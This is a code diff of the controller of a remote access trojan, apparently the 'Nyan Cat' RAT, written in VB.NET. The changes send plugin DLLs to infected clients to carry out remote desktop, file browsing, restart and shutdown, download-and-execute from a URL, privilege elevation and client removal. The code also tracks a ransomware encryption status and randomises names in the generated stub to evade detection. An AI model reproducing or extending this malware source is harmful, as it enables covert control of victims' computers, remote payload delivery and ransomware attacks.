@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##         N Y A N   C A T  |||   Updated on Aug/09/2018        ##
+'##         N Y A N   C A T  |||   Updated on Aug/11/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -241,6 +241,7 @@ Public Class Main
                         _RDP.Name = "!" + A(1)
                         _RDP.Sz = New Size(A(2), A(3))
                         _RDP.Text = "Remote Desktop - " & u.IP.Split(":")(0)
+                        _RDP.BOT = A(1)
                         _RDP.Show()
                     End If
                     Exit Select
@@ -258,7 +259,7 @@ Public Class Main
                             End If
                             Exit Sub
                         End If
-                        _RDP.PktToImage(SB(A(2)))
+                        _RDP.PktToImage(System.Text.Encoding.Default.GetBytes(A(2)))
                     End If
                     Exit Select
 #End Region
@@ -304,7 +305,6 @@ Public Class Main
                             Pass.L1.Items.Add(ii)
                             i += 9
                         Next
-                        Pass.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                     Catch ex As Exception
                     End Try
 
@@ -627,19 +627,7 @@ Public Class Main
                                 itm.Text = allFiles(i)
                                 itm.SubItems.Add(allFiles(i + 1))
                                 If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
-                                    Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
-                                    If fsize > 1073741824 Then
-                                        Dim size As Double = fsize / 1073741824
-                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
-                                    ElseIf fsize > 1048576 Then
-                                        Dim size As Double = fsize / 1048576
-                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
-                                    ElseIf fsize > 1024 Then
-                                        Dim size As Double = fsize / 1024
-                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
-                                    Else
-                                        itm.SubItems(1).Text = fsize.ToString & " B"
-                                    End If
+                                    itm.SubItems(1).Text = siz(itm.SubItems(1).Text)
                                     itm.Tag = Convert.ToInt64(allFiles(i + 1))
                                 End If
                                 If itm.Text.StartsWith("[Drive]") Then
@@ -737,7 +725,7 @@ Public Class Main
 
                     Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                     If FM IsNot Nothing Then
-                        Dim MM = New IO.MemoryStream(SB(A(2)))
+                        Dim MM = New IO.MemoryStream(System.Text.Encoding.Default.GetBytes(A(2)))
                         FM.PictureBox1.Image = Bitmap.FromStream(MM)
                         FM.Label2.ForeColor = Color.Lime
                         FM.Label2.Text = "Preview Size " & siz(A(2).Length)
@@ -1068,7 +1056,7 @@ Public Class Main
     Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + x.SubItems(ID.Index).Text)
+                Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text)
                 If _RDP Is Nothing Then
                     S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\RDP.dll")))
                 End If
@@ -1133,7 +1121,7 @@ Public Class Main
     Private Sub FIleManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FIleManagerToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                Dim FM As File_Manager = My.Application.OpenForms("FM" + x.SubItems(ID.Index).Text)
+                Dim FM As File_Manager = My.Application.OpenForms("FM" + x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text)
                 If FM Is Nothing Then
                     S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\FM.dll")))
                 End If
@@ -1197,21 +1185,21 @@ Public Class Main
     Private Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
         On Error Resume Next
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "PC-" + SPL + "1")
+            S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|1")
         Next
     End Sub
 
     Private Sub PCShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCShutdownToolStripMenuItem.Click
         On Error Resume Next
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "PC-" + SPL + "2")
+            S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|2")
         Next
     End Sub
 
     Private Sub PCLogoutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCLogoutToolStripMenuItem.Click
         On Error Resume Next
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "PC-" + SPL + "3")
+            S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|3")
         Next
     End Sub
 
@@ -1229,7 +1217,7 @@ Public Class Main
 
         If o.ShowDialog = Windows.Forms.DialogResult.OK Then
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "CL-" + SPL & "4" + SPL + IO.Path.GetFileName(o.FileName) + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True)))
+                S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True)))
             Next
         End If
     End Sub
@@ -1243,7 +1231,7 @@ Public Class Main
             Exit Sub
         Else
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "CL-" + SPL + "5" + SPL + URL + SPL + EXE)
+                S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "5" + "|'P'|" + URL + "|'P'|" + EXE)
             Next
         End If
     End Sub
@@ -1251,14 +1239,14 @@ Public Class Main
     Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
         On Error Resume Next
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "CL-" + SPL + "2")
+            S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|2")
         Next
     End Sub
 
     Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
         On Error Resume Next
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "CL-" + SPL + "1")
+            S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|1")
         Next
     End Sub
 
@@ -1269,10 +1257,11 @@ Public Class Main
             If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Encrypted" Then
                 result = MessageBox.Show("Client didn't finish decrypting yet.." & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
                 If result = DialogResult.Yes Then
-                    S.Send(x.Tag, "CL-" + SPL + "3")
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3")
+
                 End If
             Else
-                S.Send(x.Tag, "CL-" + SPL + "3")
+                S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3")
             End If
         Next
     End Sub
@@ -1293,10 +1282,6 @@ Public Class Main
         End Try
     End Sub
 
-    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
-        About.Show()
-    End Sub
-
     Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
         Try
             Dim o As New OpenFileDialog
@@ -1307,7 +1292,7 @@ Public Class Main
             If o.ShowDialog = Windows.Forms.DialogResult.OK Then
 
                 For Each x As ListViewItem In L1.SelectedItems
-                    S.Send(x.Tag, "RD-" & SPL & o.FileName & SPL & Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True)))
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "RD-|'P'|" + o.FileName + "|'P'|" + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True)))
                 Next
             End If
         Catch ex As Exception
@@ -1323,11 +1308,13 @@ Public Class Main
         Else
             For Each x As ListViewItem In L1.SelectedItems
                 S.Send(x.Tag, "RU-" & SPL & URL & SPL & EXE)
+                S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "RU-|'P'|" + URL + "|'P'|" + EXE)
+
             Next
         End If
     End Sub
 
-    Private Sub VisitURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VisitURLToolStripMenuItem.Click
+    Private Sub VisitWebsiteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VisitWebsiteToolStripMenuItem.Click
         On Error Resume Next
         Dim URL As String = InputBox("Enter URL", "Visit URL", "http://google.com")
 
@@ -1338,10 +1325,18 @@ Public Class Main
                 URL = "http://" + URL
             End If
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "Visit" + SPL + URL)
+                S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "Visit|'P'|" + URL)
             Next
         End If
     End Sub
+
+    Private Sub RunAsAdministratorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunAsAdministratorToolStripMenuItem.Click
+        On Error Resume Next
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PRI|'P'|")
+        Next
+    End Sub
+
 
     Private Sub NoteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NoteToolStripMenuItem.Click
         On Error Resume Next
@@ -1370,6 +1365,18 @@ Public Class Main
 
     End Sub
 
+    Private Sub ClientFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClientFolderToolStripMenuItem.Click
+        Try
+            For Each x As ListViewItem In L1.SelectedItems
+                Process.Start(uFolder(x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text, ""))
+            Next
+        Catch ex As Exception
+        End Try
+    End Sub
+
+    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
+        About.Show()
+    End Sub
 
 
 
@@ -1436,33 +1443,33 @@ Public Class Main
                     Else
 
                         Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath & "\Misc\Stub\Stub.exe")
-                        If chkRename.Checked Then
-                            definition.Name = New AssemblyNameDefinition(Randomi(rand.Next(6, 20)), New Version(rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10)))
-                        End If
-                        Dim definition2 As ModuleDefinition
+                    If chkRename.Checked Then
+                        definition.Name = New AssemblyNameDefinition(Randomi(rand.Next(6, 20)), New Version(rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10)))
+                    End If
+                    Dim definition2 As ModuleDefinition
                         For Each definition2 In definition.Modules
-                            If chkRename.Checked Then
-                                definition2.Name = Randomi(rand.Next(10, 30))
-                            End If
-                            Dim definition3 As TypeDefinition
+                        If chkRename.Checked Then
+                            definition2.Name = Randomi(rand.Next(5, 15))
+                        End If
+                        Dim definition3 As TypeDefinition
                             For Each definition3 In definition2.Types
                                 If chkRename.Checked Then
-                                    ' If definition3.Namespace = "Client.Lime" Then
-                                    definition3.Namespace = Randomi(rand.Next(10, 30))
-                                    definition3.Name = Randomi(rand.Next(10, 30))
-                                    '  End If
-                                    For Each F In definition3.Fields
-                                        F.Name = Randomi(rand.Next(10, 30))
-                                    Next
-                                End If
+                                ' If definition3.Namespace = "Client.Lime" Then
+                                definition3.Namespace = Randomi(rand.Next(5, 15))
+                                definition3.Name = Randomi(rand.Next(5, 15))
+                                ' End If
+                                For Each F In definition3.Fields
+                                    F.Name = Randomi(rand.Next(5, 15))
+                                Next
+                            End If
                                 Dim definition4 As MethodDefinition
                                 For Each definition4 In definition3.Methods
                                     If Not definition4.IsConstructor AndAlso Not definition4.IsRuntimeSpecialName Then
                                         If chkRename.Checked Then
-                                            definition4.Name = Randomi(rand.Next(10, 30))
-                                            For Each P As ParameterDefinition In definition4.Parameters
-                                                P.Name = Randomi(rand.Next(5, 10))
-                                            Next
+                                        definition4.Name = Randomi(rand.Next(5, 15))
+                                        For Each P As ParameterDefinition In definition4.Parameters
+                                            P.Name = Randomi(rand.Next(5, 15))
+                                        Next
                                         End If
                                     ElseIf (definition4.IsConstructor AndAlso definition4.HasBody) Then
                                         Dim enumerator As IEnumerator(Of Instruction)
